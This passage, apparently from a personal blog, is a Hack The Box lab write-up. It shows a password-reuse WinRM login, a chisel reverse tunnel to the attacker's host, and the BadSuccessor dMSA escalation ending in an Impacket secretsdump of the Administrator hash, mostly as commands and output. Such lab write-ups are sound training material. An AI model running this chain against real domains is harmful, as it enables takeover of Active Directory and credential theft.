</span></span><span style=display:flex><span>WINRM       10.129.xx.xx    <span style=color:#ae81ff>5985</span>   DC01             <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> eighteen.htb<span style=color:#ae81ff>\a</span>dam.scott:iloveyou1 <span style=color:#f92672>(</span>Pwn3d!<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Hit: <code>eighteen.htb\adam.scott</code></p><p>Get a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm -i dc01.eighteen.htb -u adam.scott -p iloveyou1
</span></span></code></pre></div><p><img src=usershell.png alt="shell as user"></p><p>User flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Get-Content C:\Users\adam.scott\Desktop\user.txt
</span></span></code></pre></div><p><img src=userflag.png alt="user flag"></p><p>and there we got the sweet flag.</p><hr><h2 id=5-priviledge-escalation-and-root-flag>5) Priviledge escalation and root flag</h2><p>Here we go to explore which rights we have as adam what we can run.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; whoami /priv
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PRIVILEGES INFORMATION
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Privilege Name                Description                    State
</span></span><span style=display:flex><span>============================= ============================== =======
</span></span><span style=display:flex><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a <span style=color:#66d9ef>process</span> working set Enabled
</span></span></code></pre></div><p>Apparently,Â <code>Adam.Scott</code>Â can add workstations and increase working set privilege. These privileges point toward Resource Based Constrained Delegation (RBCD), more precisely, aÂ <code>BadSuccessor</code>Â attack seems promising.</p><p>Before moving further, since the machine does not expose many ports, we uploadÂ <code>chisel</code>Â to access all the services running on the machine.</p><hr><h2 id=6-uploading-chisel>6) uploading chisel</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; upload chisel.exe
</span></span></code></pre></div><p>Next, we startÂ <code>chisel</code>Â in server mode on our machine, and inÂ <code>client</code>Â mode on the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chisel server --reverse --socks5 -p <span style=color:#ae81ff>6000</span>
</span></span><span style=display:flex><span>Start-Process -FilePath C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dam.scott<span style=color:#ae81ff>\D</span>ocuments<span style=color:#ae81ff>\c</span>hisel.exe
</span></span><span style=display:flex><span>-ArgumentList <span style=color:#e6db74>&#34;client&#34;</span>,<span style=color:#e6db74>&#34;10.10.16.x:6000&#34;</span>,<span style=color:#e6db74>&#34;R:socks&#34;</span>
</span></span></code></pre></div><p>Having prepared the basic setup for performing theÂ <strong>Bad Successor attack</strong>, we can now proceed with the attack. We usedÂ <code>chisel</code>Â for a coz it has a cool workaround (Impacket&rsquo;sÂ <code>getST.py</code>). TheÂ <code>BadSuccessor.exe</code>Â binary can be downloaded fromÂ <a href=https://github.com/ibaiC/BadSuccessor/tree/main/BadSuccessor/obj/Debug>here</a>.</p><p>Next, we upload the binary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>evil-winrm-py PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dam.scott<span style=color:#ae81ff>\D</span>ocuments&gt; upload BadSuccessor.exe .
</span></span></code></pre></div><p>Then identify the target Organisational Units (OUs).</p><aside>ðŸ§©<p><code>adam.scott</code> (via IT group) can WRITE on <code>OU=Staff</code>. Environment is Windows 11 / Server 2025 (Build 26100). This suggests the Bad Successor (dMSA) path.</p></aside><p>Refs: <a href=https://intruceptlabs.com/2025/05/badsuccessor-vulnerability-in-windows-server-2025-enables-domain-admin-privilege-escalation/>Intrucept</a> Â· <a href=https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory>Akamai</a> Â· <a href="https://www.cve.org/CVERecord?id=CVE-2025-33073">CVEâ€‘2025â€‘33073</a></p><p>Validate permissions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>evil-winrm-py PS C:\Users\adam.scott\Documents&gt; ./BadSuccessor.exe find
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ______           __ _______                                               
</span></span><span style=display:flex><span>    |   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
</span></span><span style=display:flex><span>    |   __ &lt; |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
</span></span><span style=display:flex><span>    |______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Researcher<span style=color:#960050;background-color:#1e0010>:</span> @YuG0rd
</span></span><span style=display:flex><span>    Author<span style=color:#960050;background-color:#1e0010>:</span> @kreepsec
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    [*] OUs you have write access to<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>        -&gt; OU=Domain Controllers,DC=eighteen,DC=htb
</span></span><span style=display:flex><span>        Privileges<span style=color:#960050;background-color:#1e0010>:</span> GenericWrite, GenericAll
</span></span><span style=display:flex><span>        -&gt; OU=Staff,DC=eighteen,DC=htb
</span></span><span style=display:flex><span>        Privileges<span style=color:#960050;background-color:#1e0010>:</span> GenericWrite, GenericAll, CreateChild
</span></span></code></pre></div><hr><h2 id=7-privesc-via-bad-successor-dmsa>7) Privâ€‘esc via Bad Successor (dMSA)</h2><p>** * Create the malicious account.***</p><p>Create dMSA linked to Administrator and grant selfâ€‘service:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\BadSuccessor.exe escalate \
</span></span><span style=display:flex><span>  -targetOU <span style=color:#e6db74>&#34;OU=Staff,DC=eighteen,DC=htb&#34;</span> \
</span></span><span style=display:flex><span>  -dmsa <span style=color:#e6db74>&#34;BAD_DMSA&#34;</span> \
</span></span><span style=display:flex><span>  -targetUser <span style=color:#e6db74>&#34;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#34;</span> \
</span></span><span style=display:flex><span>  -dnshostname <span style=color:#e6db74>&#34;BAD_DMSA&#34;</span> \
</span></span><span style=display:flex><span>  -user <span style=color:#e6db74>&#34;adam.scott&#34;</span>
</span></span></code></pre></div><pre tabindex=0><code>evil-winrm-py PS C:\Users\adam.scott\Documents&gt; .\BadSuccessor.exe escalate -targetOU &#34;OU=Staff,DC=eighteen,DC=ht
b&#34; -dmsa BAD_DMSA -targetUser &#34;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#34;  -dnshostname BAD_DMSA -user ada
m.scott -dc-ip 10.10.11.95
    ______           __ _______                                               
    |   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
    |   __ &lt; |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
    |______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|  

    Researcher: @YuG0rd
    Author: @kreepsec

    [*] Creating dMSA object...
    [*] Inheriting target user privileges
        -&gt; msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
        -&gt; msDS-DelegatedMSAState = 2
    [+] Privileges Obtained.
    [*] Setting PrincipalsAllowedToRetrieveManagedPassword
        -&gt; msDS-GroupMSAMembership = adam.scott
    [+] Setting userAccountControl attribute
    [+] Setting msDS-SupportedEncryptionTypes attribute

    [+] Created dMSA &#39;BAD_DMSA&#39; in &#39;OU=Staff,DC=eighteen,DC=htb&#39;, linked to &#39;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#39; (DC: 10.10.11.95)
</code></pre><p>And now we move to the final phase of extracting the ticket.</p><blockquote><p>For executing this, the latest version ofÂ <a href=https://github.com/fortra/impacket>Fortra-Impacket</a>Â from the main branch which supports theÂ <code>-dmsa</code>Â flag is required.</p></blockquote><p>Next, we get the TGT forÂ <code>Adam.Scott</code>Â for kerberos authentication.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 getTGT.py eighteen.htb/adam.scott:<span style=color:#e6db74>&#39;iloveyou1&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> config file found: /etc/proxychains4.conf
</span></span></code></pre></div><p>export</p><pre tabindex=0><code>export KRB5CCNAME=adam.scott.ccache
</code></pre><p>Then we impersonateÂ BAD_DMSAÂ throughÂ <code>Adam.Scott</code>Â and dump BAD_DMSAÂ <em>krbtgt</em>.Use;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>proxychains4 getST.py <span style=color:#e6db74>&#39;eighteen.htb/adam.scott&#39;</span>:<span style=color:#e6db74>&#39;iloveyou1&#39;</span> -impersonate <span style=color:#e6db74>&#39;BAD_DMSA$&#39;</span> -self -dmsa -dc-ip 10.10.11.95 
</span></span></code></pre></div><p>Now, using this ticket, we get a service ticket forÂ <code>cisf/dc01.eighteen.htb</code>Â to dump credentials.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>export KRB5CCNAME=<span style=color:#e6db74>&#39;BAD_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache&#39;</span>
</span></span></code></pre></div><pre tabindex=0><code>proxychains4  getST.py -k -no-pass -spn cifs/dc01.eighteen.htb -dc-ip 10.10.11.95 &#39;eighteen.htb/BAD_DMSA$&#39;
</code></pre><p>And finally, dump Administrator&rsquo;s credentials using the service ticket.</p><pre tabindex=0><code>export KRB5CCNAME=&#39;BAD_DMSA$@cifs_dc01.eighteen.htb@EIGHTEEN.HTB.ccache&#39;
</code></pre><pre tabindex=0><code>proxychains4 secretsdump.py -k -no-pass -just-dc-user administrator -dc-ip 10.10.11.95 -target-ip 10.10.11.95 dc01.eighteen.htb
</code></pre><p>This reveals the admin hash.</p><h2 id=root-flag>ROOT FLAG</h2><p>Finally we can get root flag.</p><p><img src=adminshell.png alt="root shell"></p><p>and we got it</p><p><img src=rootflag.png alt="root flag"></p><p>and there we have it.</p><p><img src=pwnedfinal.png alt=accomplishment></p><hr><h3 id=lessons-learned>Lessons learned</h3><ul><li>MSSQL impersonation + app DB exposure = quick credential leverage</li><li>Password reuse enables easy lateral movement to WinRM</li><li>Server 2025 dMSA + OU write can be catastrophic (Bad Successor)</li></ul><aside>ðŸ“Ž<p>References: <a href=http://fixtime.sh>fixtime.sh</a> Â· <a href=https://github.com/5epi0l/ADUtilities>ADUtilities</a> Â· <a href=https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash>0xdf</a> Â· <a href=https://hashcat.net/forum/thread-8391-post-44775.html#pid44775>Hashcat forum</a> Â· <a href=https://intruceptlabs.com/2025/05/badsuccessor-vulnerability-in-windows-server-2025-enables-domain-admin-privilege-escalation/>Intrucept</a> Â· <a href=https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory>Akamai</a> Â· <a href="https://www.cve.org/CVERecord?id=CVE-2025-33073">CVE</a></p></aside><p><em><strong>HAPPY HACKING!!!</strong></em></p></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>